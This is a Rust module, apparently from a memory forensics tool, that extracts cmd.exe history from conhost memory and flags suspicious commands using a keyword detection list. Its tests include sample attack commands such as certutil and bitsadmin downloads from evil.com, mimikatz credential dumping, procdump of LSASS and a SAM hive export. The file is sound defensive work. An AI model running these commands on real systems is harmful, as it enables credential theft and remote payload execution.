//! Windows console command history extraction (MITRE ATT&CK T1059.003).
//!
//! Extracts command history from `conhost.exe` / `csrss.exe` memory by
//! walking the `_CONSOLE_INFORMATION` -> `HistoryList` ->
//! `_COMMAND_HISTORY` -> command buffer chain.  Shows commands typed into
//! `cmd.exe` sessions — critical evidence for post-exploitation analysis.
//!
//! Equivalent to Volatility's `consoles` plugin.
//!
//! Key forensic indicators:
//! - Credential harvesting (`net user`, `net localgroup`, `mimikatz`)
//! - Reconnaissance (`whoami`, `wmic /node:`)
//! - Lateral movement (`certutil -urlcache`, `bitsadmin /transfer`)
//! - Encoded payloads (`powershell -enc`, base64-like long arguments)

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

use crate::unicode::read_unicode_string;

/// A single command extracted from a console history buffer.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ConsoleHistoryInfo {
    /// PID of the owning conhost.exe / csrss.exe process.
    pub pid: u32,
    /// Name of the console host process (e.g. `conhost.exe`).
    pub process_name: String,
    /// Application that owns this history (e.g. `cmd.exe`).
    pub application: String,
    /// The command text typed by the user.
    pub command: String,
    /// Zero-based index of the command within its history buffer.
    pub command_index: u32,
    /// Whether this command matches known post-exploitation patterns.
    pub is_suspicious: bool,
}

/// Classify a console command as suspicious.
///
/// Returns `true` when the command matches patterns commonly associated
/// with post-exploitation activity:
///
/// - `net user` / `net localgroup` — credential and group enumeration
/// - `whoami` — privilege reconnaissance
/// - `mimikatz` — credential dumping tool
/// - `procdump` — LSASS memory dump for offline credential extraction
/// - `reg save` — registry hive export (SAM/SECURITY/SYSTEM)
/// - `certutil -urlcache` — LOLBin file download
/// - `powershell -enc` — encoded PowerShell payload execution
/// - `bitsadmin /transfer` — LOLBin file download via BITS
/// - `wmic /node:` — remote WMI execution (lateral movement)
/// - Base64-like long arguments (>80 chars of `[A-Za-z0-9+/=]`)
pub fn classify_console_command(command: &str) -> bool {
    if command.is_empty() {
        return false;
    }
    let lower = command.to_lowercase();

    if lower.contains("net user")
        || lower.contains("net localgroup")
        || lower.contains("whoami")
        || lower.contains("mimikatz")
        || lower.contains("procdump")
        || lower.contains("reg save")
        || lower.contains("certutil -urlcache")
        || lower.contains("powershell -enc")
        || lower.contains("bitsadmin /transfer")
        || lower.contains("wmic /node:")
    {
        return true;
    }

    // Base64-like long argument: any token >80 chars of [A-Za-z0-9+/=]
    for token in command.split_whitespace() {
        if token.len() > 80
            && token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
        {
            return true;
        }
    }

    false
}

/// Console host process names to search for.
const CONSOLE_HOST_NAMES: &[&str] = &["conhost.exe", "csrss.exe"];

/// Maximum number of command history entries per console (safety limit).
const MAX_HISTORY_ENTRIES: usize = 4096;

/// Maximum number of commands per history buffer (safety limit).
const MAX_COMMANDS_PER_HISTORY: usize = 4096;

/// Scan window size for _CONSOLE_INFORMATION signature search (bytes).
const SCAN_WINDOW_SIZE: usize = 512 * 1024; // 512 KB

/// Walk console command history from `conhost.exe` / `csrss.exe` memory.
///
/// Finds console host processes, locates `_CONSOLE_INFORMATION` structures,
/// walks `HistoryList` linked lists to `_COMMAND_HISTORY` entries, and reads
/// each command buffer.
///
/// Returns an empty `Vec` when the required symbols (`PsActiveProcessHead`)
/// cannot be resolved — graceful degradation.
pub fn walk_consoles<P: PhysicalMemoryProvider + Clone>(
    reader: &ObjectReader<P>,
) -> crate::Result<Vec<ConsoleHistoryInfo>> {
    let ps_head = match reader.symbols().symbol_address("PsActiveProcessHead") {
        Some(a) => a,
        None => return Ok(Vec::new()),
    };

    let procs = crate::process::walk_processes(reader, ps_head)
        .unwrap_or_default();

    let mut results = Vec::new();

    for proc in &procs {
        let name_lower = proc.image_name.to_lowercase();
        if !CONSOLE_HOST_NAMES.iter().any(|&n| name_lower == n) {
            continue;
        }

        let peb_addr = proc.peb_addr;
        if peb_addr == 0 || proc.cr3 == 0 {
            continue;
        }

        // Use a per-process reader with the process CR3
        let proc_reader = reader.with_cr3(proc.cr3);

        let cmds = extract_console_commands(
            &proc_reader,
            proc.pid as u32,
            &proc.image_name,
            peb_addr,
        )
        .unwrap_or_default();
        results.extend(cmds);
    }

    Ok(results)
}

/// Extract console commands from a single console host process.
///
/// Scans the process heap region for `_CONSOLE_INFORMATION` signature,
/// then walks `HistoryList` to find `_COMMAND_HISTORY` entries and their
/// command buffers.
fn extract_console_commands<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    pid: u32,
    process_name: &str,
    peb_addr: u64,
) -> crate::Result<Vec<ConsoleHistoryInfo>> {
    if peb_addr == 0 {
        return Ok(Vec::new());
    }

    // Default offset for ProcessHeap in PEB: 0x30 on x64
    let peb_heap_off = reader
        .symbols()
        .field_offset("_PEB", "ProcessHeap")
        .unwrap_or(0x30) as u64;

    let heap_addr = read_ptr(reader, peb_addr + peb_heap_off);
    if heap_addr == 0 {
        return Ok(Vec::new());
    }

    // Field offsets for _CONSOLE_INFORMATION and _COMMAND_HISTORY
    let hist_list_off = reader
        .symbols()
        .field_offset("_CONSOLE_INFORMATION", "HistoryList")
        .unwrap_or(0x40) as u64;
    let cmd_hist_list_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "ListEntry")
        .unwrap_or(0) as u64;
    let cmd_hist_app_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "Application")
        .unwrap_or(0x10) as u64;
    let cmd_hist_count_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "CommandCount")
        .unwrap_or(0x20) as u64;
    let cmd_hist_buf_off = reader
        .symbols()
        .field_offset("_COMMAND_HISTORY", "CommandBucket")
        .unwrap_or(0x28) as u64;
    let cmd_entry_size_off = reader
        .symbols()
        .field_offset("_COMMAND", "CommandLength")
        .unwrap_or(0) as u64;
    let cmd_entry_data_off = reader
        .symbols()
        .field_offset("_COMMAND", "Command")
        .unwrap_or(0x08) as u64;

    // Scan heap for _CONSOLE_INFORMATION candidates
    let candidates = scan_for_console_info(reader, heap_addr, hist_list_off);

    let mut results = Vec::new();

    for cand_addr in candidates {
        let list_head = cand_addr + hist_list_off;

        // Walk history list to get _COMMAND_HISTORY entries
        let hist_entries = walk_history_list(reader, list_head, cmd_hist_list_off);

        for hist_addr in hist_entries {
            // Read application name (_UNICODE_STRING at cmd_hist_app_off)
            let app_uni_addr = hist_addr + cmd_hist_app_off;
            let application = read_unicode_string(reader, app_uni_addr).unwrap_or_default();

            let command_count = read_u32(reader, hist_addr + cmd_hist_count_off);
            if command_count == 0 || command_count as usize > MAX_COMMANDS_PER_HISTORY {
                continue;
            }

            let bucket_ptr = read_ptr(reader, hist_addr + cmd_hist_buf_off);
            if bucket_ptr == 0 {
                continue;
            }

            for i in 0..command_count as u64 {
                let cmd_entry_ptr = read_ptr(reader, bucket_ptr + i * 8);
                if cmd_entry_ptr == 0 {
                    continue;
                }

                let cmd_byte_len = read_u16(reader, cmd_entry_ptr + cmd_entry_size_off);
                if cmd_byte_len == 0 {
                    continue;
                }

                let command = read_utf16_string(
                    reader,
                    cmd_entry_ptr + cmd_entry_data_off,
                    cmd_byte_len as usize,
                );

                let is_suspicious = classify_console_command(&command);
                results.push(ConsoleHistoryInfo {
                    pid,
                    process_name: process_name.to_string(),
                    application: application.clone(),
                    command,
                    command_index: i as u32,
                    is_suspicious,
                });
            }
        }
    }

    Ok(results)
}

/// Scan a memory region for potential `_CONSOLE_INFORMATION` structures.
///
/// Looks for addresses where the HistoryList field contains a valid
/// doubly-linked list (Flink and Blink are non-null kernel-mode pointers).
fn scan_for_console_info<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    base_addr: u64,
    hist_list_off: u64,
) -> Vec<u64> {
    let hist_off = hist_list_off as usize;
    // Read a chunk of the heap area for scanning
    let scan_size = SCAN_WINDOW_SIZE;
    let data = match reader.read_bytes(base_addr, scan_size) {
        Ok(b) => b,
        Err(_) => return Vec::new(),
    };

    // Need at least hist_off + 16 bytes (Flink + Blink)
    if hist_off + 16 > data.len() {
        return Vec::new();
    }

    let mut candidates = Vec::new();

    // Scan each 8-byte aligned offset
    let max_offset = data.len().saturating_sub(hist_off + 16);
    let mut offset = 0usize;
    while offset <= max_offset {
        let flink_off = hist_off;
        let blink_off = hist_off + 8;

        let flink = u64::from_le_bytes(
            data[offset + flink_off..offset + flink_off + 8]
                .try_into()
                .unwrap_or([0u8; 8]),
        );
        let blink = u64::from_le_bytes(
            data[offset + blink_off..offset + blink_off + 8]
                .try_into()
                .unwrap_or([0u8; 8]),
        );

        if is_plausible_pointer(flink) && is_plausible_pointer(blink) {
            // Self-consistency: flink->blink should equal head_addr
            let head_addr = base_addr + offset as u64 + hist_list_off;
            let flink_blink = read_ptr(reader, flink + 8);
            if flink_blink == head_addr {
                candidates.push(base_addr + offset as u64);
            }
        }

        offset += 8;
    }

    candidates
}

/// Walk a `_LIST_ENTRY` doubly-linked list to find `_COMMAND_HISTORY` entries.
///
/// Starting from the list head, follows Flink pointers and adjusts each
/// back to the containing `_COMMAND_HISTORY` structure using `list_entry_off`.
fn walk_history_list<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    list_head: u64,
    list_entry_off: u64,
) -> Vec<u64> {
    let mut entries = Vec::new();
    let mut seen = std::collections::HashSet::new();

    let first_flink = read_ptr(reader, list_head);
    if first_flink == 0 || first_flink == list_head {
        return Vec::new();
    }

    let mut current = first_flink;
    loop {
        if current == list_head || current == 0 {
            break;
        }
        if !seen.insert(current) {
            break; // cycle detection
        }
        if entries.len() >= MAX_HISTORY_ENTRIES {
            break;
        }

        let struct_addr = current.wrapping_sub(list_entry_off);
        entries.push(struct_addr);

        current = read_ptr(reader, current); // Follow Flink (at offset 0 of LIST_ENTRY)
    }

    entries
}

/// Check whether a pointer value looks plausible (not obviously garbage).
fn is_plausible_pointer(addr: u64) -> bool {
    if addr == 0 {
        return false;
    }
    // Canonical address check: top 16 bits must be either all 0 (user) or all 1 (kernel)
    let top = addr >> 48;
    top == 0 || top == 0xFFFF
}

/// Read a pointer (u64) from virtual memory, returning 0 on failure.
fn read_ptr<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, addr: u64) -> u64 {
    reader
        .read_bytes(addr, 8)
        .map(|b| u64::from_le_bytes(b[..8].try_into().unwrap()))
        .unwrap_or(0)
}

/// Read a u32 from virtual memory, returning 0 on failure.
fn read_u32<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, addr: u64) -> u32 {
    reader
        .read_bytes(addr, 4)
        .map(|b| u32::from_le_bytes(b[..4].try_into().unwrap()))
        .unwrap_or(0)
}

/// Read a u16 from virtual memory, returning 0 on failure.
fn read_u16<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, addr: u64) -> u16 {
    reader
        .read_bytes(addr, 2)
        .map(|b| u16::from_le_bytes(b[..2].try_into().unwrap()))
        .unwrap_or(0)
}

/// Read a UTF-16LE string of `byte_len` bytes from virtual memory.
fn read_utf16_string<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    addr: u64,
    byte_len: usize,
) -> String {
    if byte_len == 0 || addr == 0 {
        return String::new();
    }
    match reader.read_bytes(addr, byte_len) {
        Ok(bytes) => {
            let units: Vec<u16> = bytes
                .chunks_exact(2)
                .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
                .collect();
            String::from_utf16_lossy(&units).to_string()
        }
        Err(_) => String::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---------------------------------------------------------------
    // classify_console_command tests
    // ---------------------------------------------------------------

    /// A normal `cd` command is benign.
    #[test]
    fn classify_normal_cd_benign() {
        assert!(!classify_console_command("cd C:\\Windows"));
    }

    /// A normal `dir` command is benign.
    #[test]
    fn classify_dir_benign() {
        assert!(!classify_console_command("dir /s"));
    }

    /// A normal `type` command is benign.
    #[test]
    fn classify_type_benign() {
        assert!(!classify_console_command("type readme.txt"));
    }

    /// An empty command is benign.
    #[test]
    fn classify_empty_benign() {
        assert!(!classify_console_command(""));
    }

    /// `net user` enumeration is suspicious.
    #[test]
    fn classify_net_user_suspicious() {
        assert!(classify_console_command("net user administrator"));
    }

    /// `net localgroup` enumeration is suspicious.
    #[test]
    fn classify_net_localgroup_suspicious() {
        assert!(classify_console_command("net localgroup administrators"));
    }

    /// `whoami` reconnaissance is suspicious.
    #[test]
    fn classify_whoami_suspicious() {
        assert!(classify_console_command("whoami /all"));
    }

    /// `mimikatz` is suspicious regardless of arguments.
    #[test]
    fn classify_mimikatz_suspicious() {
        assert!(classify_console_command("mimikatz.exe sekurlsa::logonpasswords"));
    }

    /// `procdump` against lsass is suspicious.
    #[test]
    fn classify_procdump_suspicious() {
        assert!(classify_console_command("procdump -ma lsass.exe lsass.dmp"));
    }

    /// `reg save` hive export is suspicious.
    #[test]
    fn classify_reg_save_suspicious() {
        assert!(classify_console_command("reg save HKLM\\SAM C:\\sam.hiv"));
    }

    /// `certutil -urlcache` download technique is suspicious.
    #[test]
    fn classify_certutil_suspicious() {
        assert!(classify_console_command("certutil -urlcache -split -f http://evil.com/payload.exe"));
    }

    /// `powershell -enc` with encoded payload is suspicious.
    #[test]
    fn classify_powershell_enc_suspicious() {
        assert!(classify_console_command("powershell -enc AAABBBCCC"));
    }

    /// `bitsadmin /transfer` download is suspicious.
    #[test]
    fn classify_bitsadmin_suspicious() {
        assert!(classify_console_command("bitsadmin /transfer job http://evil.com/x.exe C:\\x.exe"));
    }

    /// `wmic /node:` remote execution is suspicious.
    #[test]
    fn classify_wmic_remote_suspicious() {
        assert!(classify_console_command("wmic /node:192.168.1.1 process call create cmd.exe"));
    }

    /// Pattern matching is case-insensitive.
    #[test]
    fn classify_case_insensitive() {
        assert!(classify_console_command("WHOAMI"));
        assert!(classify_console_command("Net User Admin"));
    }

    /// Base64-like long argument (>80 chars) triggers detection.
    #[test]
    fn classify_base64_long_argument_suspicious() {
        let b64 = "A".repeat(81);
        assert!(classify_console_command(&b64));
    }

    /// Long but non-base64 argument is benign (contains backslash which is not base64).
    #[test]
    fn classify_long_non_base64_benign() {
        // Token has backslash → not all alphanumeric → not base64-like
        let long_path = format!("C:\\Windows\\{}", "a".repeat(80));
        assert!(!classify_console_command(&long_path));
    }

    /// Exactly 80-char token is NOT flagged (needs >80).
    #[test]
    fn classify_exactly_80_char_token_benign() {
        let token = "A".repeat(80);
        assert!(!classify_console_command(&token));
    }

    /// Exactly 81-char base64 token IS flagged.
    #[test]
    fn classify_exactly_81_char_base64_suspicious() {
        let token = "A".repeat(81);
        assert!(classify_console_command(&token));
    }

    // ---------------------------------------------------------------
    // is_plausible_pointer tests
    // ---------------------------------------------------------------

    #[test]
    fn plausible_pointer_null_rejected() {
        assert!(!is_plausible_pointer(0));
    }

    #[test]
    fn plausible_pointer_canonical_user_mode() {
        assert!(is_plausible_pointer(0x0000_7FFF_1234_5678));
    }

    #[test]
    fn plausible_pointer_canonical_kernel_mode() {
        assert!(is_plausible_pointer(0xFFFF_8000_1234_5678));
    }

    #[test]
    fn plausible_pointer_non_canonical_rejected() {
        // Non-canonical: top 16 bits = 0x0001
        assert!(!is_plausible_pointer(0x0001_0000_1234_5678));
    }

    // ---------------------------------------------------------------
    // ConsoleHistoryInfo struct and serialization tests
    // ---------------------------------------------------------------

    #[test]
    fn console_history_info_construction() {
        let info = ConsoleHistoryInfo {
            pid: 1234,
            process_name: "conhost.exe".to_string(),
            application: "cmd.exe".to_string(),
            command: "whoami".to_string(),
            command_index: 0,
            is_suspicious: true,
        };
        assert_eq!(info.pid, 1234);
        assert_eq!(info.command, "whoami");
    }

    #[test]
    fn console_history_info_serialization() {
        let info = ConsoleHistoryInfo {
            pid: 4,
            process_name: "conhost.exe".to_string(),
            application: "cmd.exe".to_string(),
            command: "dir".to_string(),
            command_index: 0,
            is_suspicious: false,
        };
        let json = serde_json::to_string(&info).unwrap();
        assert!(json.contains("conhost.exe"));
        assert!(json.contains("\"is_suspicious\":false"));
    }

    // ---------------------------------------------------------------
    // walk_consoles: no PsActiveProcessHead → empty results
    // ---------------------------------------------------------------

    /// When PsActiveProcessHead is not in symbols, walker returns empty.
    #[test]
    fn walk_no_symbol_returns_empty() {
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = walk_consoles(&reader).unwrap();
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------
    // walk_consoles: PsActiveProcessHead present, empty process list
    // ---------------------------------------------------------------

    /// When PsActiveProcessHead is present but the process list is empty
    /// (Flink == list head), the walker exercises the body and returns empty.
    #[test]
    fn walk_consoles_empty_process_list_returns_empty() {
        const PS_VADDR: u64 = 0xFFFF_8000_0030_0000;
        const PS_PADDR: u64 = 0x0030_0000;

        // Walk uses walk_list_with which requires _LIST_ENTRY.Flink and _EPROCESS.ActiveProcessLinks
        let isf = IsfBuilder::new()
            .add_struct("_LIST_ENTRY", 16)
            .add_field("_LIST_ENTRY", "Flink", 0, "pointer")
            .add_struct("_EPROCESS", 512)
            .add_field("_EPROCESS", "ActiveProcessLinks", 0, "_LIST_ENTRY")
            .add_struct("_KPROCESS", 64)
            .add_struct("_PEB", 64)
            .add_symbol("PsActiveProcessHead", PS_VADDR)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        // Empty circular list: Flink points to itself
        let mut ps_page = vec![0u8; 4096];
        ps_page[0..8].copy_from_slice(&PS_VADDR.to_le_bytes()); // Flink = self

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(PS_VADDR, PS_PADDR, flags::WRITABLE)
            .write_phys(PS_PADDR, &ps_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = walk_consoles(&reader).unwrap();
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------
    // Constants
    // ---------------------------------------------------------------

    #[test]
    fn scan_window_size_reasonable() {
        assert!(SCAN_WINDOW_SIZE >= 64 * 1024);
        assert!(SCAN_WINDOW_SIZE <= 4 * 1024 * 1024);
    }

    #[test]
    fn console_host_names_includes_conhost() {
        assert!(CONSOLE_HOST_NAMES.contains(&"conhost.exe"));
    }

    #[test]
    fn max_history_entries_reasonable() {
        assert!(MAX_HISTORY_ENTRIES >= 64);
    }

    // ---------------------------------------------------------------
    // Private helper function coverage (read_ptr, read_u32, read_u16,
    // read_utf16_string, walk_history_list, scan_for_console_info)
    // ---------------------------------------------------------------

    use memf_core::test_builders::{flags, PageTableBuilder, SyntheticPhysMem};
    use memf_core::vas::{TranslationMode, VirtualAddressSpace};
    use memf_symbols::isf::IsfResolver;
    use memf_symbols::test_builders::IsfBuilder;

    fn make_minimal_reader() -> ObjectReader<SyntheticPhysMem> {
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        ObjectReader::new(vas, Box::new(resolver))
    }

    /// read_ptr returns 0 when the address is not mapped.
    #[test]
    fn read_ptr_unmapped_returns_zero() {
        let reader = make_minimal_reader();
        assert_eq!(read_ptr(&reader, 0xDEAD_BEEF_0000_0000), 0);
    }

    /// read_ptr returns the correct u64 from mapped memory.
    #[test]
    fn read_ptr_mapped_returns_value() {
        const VADDR: u64 = 0xFFFF_8000_0028_0000;
        const PADDR: u64 = 0x0028_0000;
        let mut page = vec![0u8; 4096];
        page[0..8].copy_from_slice(&0xDEAD_CAFEu64.to_le_bytes());
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        assert_eq!(read_ptr(&reader, VADDR), 0xDEAD_CAFE);
    }

    /// read_u32 returns 0 when unmapped and correct value when mapped.
    #[test]
    fn read_u32_mapped_and_unmapped() {
        let reader = make_minimal_reader();
        assert_eq!(read_u32(&reader, 0xBAAD_CAFE_0000_0000), 0);

        const VADDR: u64 = 0xFFFF_8000_0027_0000;
        const PADDR: u64 = 0x0027_0000;
        let mut page = vec![0u8; 4096];
        page[0..4].copy_from_slice(&0xDEAD_BEEFu32.to_le_bytes());
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader2 = ObjectReader::new(vas, Box::new(resolver));
        assert_eq!(read_u32(&reader2, VADDR), 0xDEAD_BEEF);
    }

    /// read_u16 returns 0 when unmapped and correct value when mapped.
    #[test]
    fn read_u16_mapped_and_unmapped() {
        let reader = make_minimal_reader();
        assert_eq!(read_u16(&reader, 0xBAAD_0000_0000_0000), 0);

        const VADDR: u64 = 0xFFFF_8000_0026_0000;
        const PADDR: u64 = 0x0026_0000;
        let mut page = vec![0u8; 4096];
        page[0..2].copy_from_slice(&0xABCDu16.to_le_bytes());
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader2 = ObjectReader::new(vas, Box::new(resolver));
        assert_eq!(read_u16(&reader2, VADDR), 0xABCD);
    }

    /// read_utf16_string decodes UTF-16LE correctly.
    #[test]
    fn read_utf16_string_decodes_correctly() {
        const VADDR: u64 = 0xFFFF_8000_0025_0000;
        const PADDR: u64 = 0x0025_0000;
        let text = "Hello";
        let utf16: Vec<u8> = text.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut page = vec![0u8; 4096];
        page[..utf16.len()].copy_from_slice(&utf16);
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        assert_eq!(read_utf16_string(&reader, VADDR, utf16.len()), "Hello");
    }

    /// read_utf16_string returns empty string when unmapped.
    #[test]
    fn read_utf16_string_unmapped_returns_empty() {
        let reader = make_minimal_reader();
        assert_eq!(read_utf16_string(&reader, 0xDEAD_0000_0000_0000, 10), "");
    }

    /// walk_history_list returns empty when current == list_head (empty circular list).
    #[test]
    fn walk_history_list_empty_circular_returns_empty() {
        const VADDR: u64 = 0xFFFF_8000_0024_0000;
        const PADDR: u64 = 0x0024_0000;
        let mut page = vec![0u8; 4096];
        // Flink at VADDR = VADDR (self-loop)
        page[0..8].copy_from_slice(&VADDR.to_le_bytes());
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        // list_head = VADDR, first_flink = VADDR (= list_head) → empty
        let entries = walk_history_list(&reader, VADDR, 0);
        assert!(entries.is_empty());
    }

    /// walk_history_list terminates when it encounters a pointer it has already seen (cycle detection).
    #[test]
    fn walk_history_list_cycle_detection_stops() {
        const VADDR: u64 = 0xFFFF_8000_0023_0000;
        const PADDR: u64 = 0x0023_0000;
        // Node A at VADDR+0x100: Flink = VADDR+0x200
        // Node B at VADDR+0x200: Flink = VADDR+0x100 (cycle back to A)
        // list_head = VADDR
        let node_a = VADDR + 0x100;
        let node_b = VADDR + 0x200;
        let mut page = vec![0u8; 4096];
        // list_head Flink = node_a
        page[0..8].copy_from_slice(&node_a.to_le_bytes());
        // node_a Flink = node_b
        page[0x100..0x108].copy_from_slice(&node_b.to_le_bytes());
        // node_b Flink = node_a (cycle)
        page[0x200..0x208].copy_from_slice(&node_a.to_le_bytes());
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let entries = walk_history_list(&reader, VADDR, 0);
        // Should get 2 entries (A and B) then stop at cycle
        assert_eq!(entries.len(), 2);
    }

    /// walk_history_list terminates at null pointer (read_ptr returns 0).
    #[test]
    fn walk_history_list_null_flink_stops() {
        let reader = make_minimal_reader();
        // list_head at unmapped address → read_ptr returns 0 → first_flink = 0 → empty
        let entries = walk_history_list(&reader, 0xDEAD_BEEF_1234_0000, 0);
        assert!(entries.is_empty());
    }

    /// scan_for_console_info returns empty when the heap area cannot be read.
    #[test]
    fn scan_for_console_info_unreadable_heap_returns_empty() {
        let reader = make_minimal_reader();
        let result = scan_for_console_info(&reader, 0xBAD_0000_0000_0000, 0x40);
        assert!(result.is_empty());
    }

    /// scan_for_console_info returns empty when hist_off + 16 > data.len().
    #[test]
    fn scan_for_console_info_hist_off_too_large_returns_empty() {
        // Map a small page (4096 bytes) and pass hist_list_off = 4090 so hist_off+16 > 4096
        const VADDR: u64 = 0xFFFF_8000_0022_0000;
        const PADDR: u64 = 0x0022_0000;
        let page = vec![0u8; 4096];
        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(VADDR, PADDR, flags::WRITABLE)
            .write_phys(PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        // hist_list_off > SCAN_WINDOW_SIZE → read succeeds but scan window will be 4096 bytes
        // (SCAN_WINDOW_SIZE = 512KB, but physical page is only 4096 bytes of contiguous virtual)
        // Use hist_off = SCAN_WINDOW_SIZE - 8 so hist_off+16 > data.len()
        let result = scan_for_console_info(&reader, VADDR, (SCAN_WINDOW_SIZE - 8) as u64);
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------
    // extract_console_commands coverage
    // ---------------------------------------------------------------

    /// extract_console_commands returns empty when peb_addr == 0.
    #[test]
    fn extract_console_commands_peb_zero_returns_empty() {
        let reader = make_minimal_reader();
        let result = extract_console_commands(&reader, 1, "conhost.exe", 0).unwrap();
        assert!(result.is_empty());
    }

    /// extract_console_commands returns empty when heap_addr (ProcessHeap) == 0.
    /// We map a PEB page with ProcessHeap = 0 at the expected field offset.
    #[test]
    fn extract_console_commands_heap_zero_returns_empty() {
        const PEB_VADDR: u64 = 0x0000_7FFF_0020_0000;
        const PEB_PADDR: u64 = 0x0020_0000;
        let isf = IsfBuilder::new()
            .add_struct("_PEB", 64)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let peb_page = vec![0u8; 4096]; // ProcessHeap = 0 at 0x30
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(PEB_VADDR, PEB_PADDR, flags::WRITABLE)
            .write_phys(PEB_PADDR, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = extract_console_commands(&reader, 1, "conhost.exe", PEB_VADDR).unwrap();
        assert!(result.is_empty());
    }

    /// extract_console_commands: non-zero PEB and heap, but heap is not mappable
    /// for scan → scan_for_console_info returns empty → extract returns empty.
    #[test]
    fn extract_console_commands_unmapped_heap_returns_empty() {
        const PEB_VADDR: u64 = 0x0000_7FFF_001F_0000;
        const PEB_PADDR: u64 = 0x001F_0000;
        const HEAP_VADDR: u64 = 0xBAD0_0000_0000_0000; // non-canonical → unmapped

        let isf = IsfBuilder::new()
            .add_struct("_PEB", 64)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let mut peb_page = vec![0u8; 4096];
        peb_page[0x30..0x38].copy_from_slice(&HEAP_VADDR.to_le_bytes());
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(PEB_VADDR, PEB_PADDR, flags::WRITABLE)
            .write_phys(PEB_PADDR, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = extract_console_commands(&reader, 1, "conhost.exe", PEB_VADDR).unwrap();
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------
    // Additional classify_console_command edge cases
    // ---------------------------------------------------------------

    /// Token with non-base64 char (backslash) is not flagged even if long.
    #[test]
    fn classify_long_token_with_backslash_benign() {
        let long_path = format!("C:\\{}", "a".repeat(80));
        assert!(!classify_console_command(&long_path));
    }

    /// Token with '+' and '/' characters is base64-like when >80 chars.
    #[test]
    fn classify_base64_with_plus_slash_suspicious() {
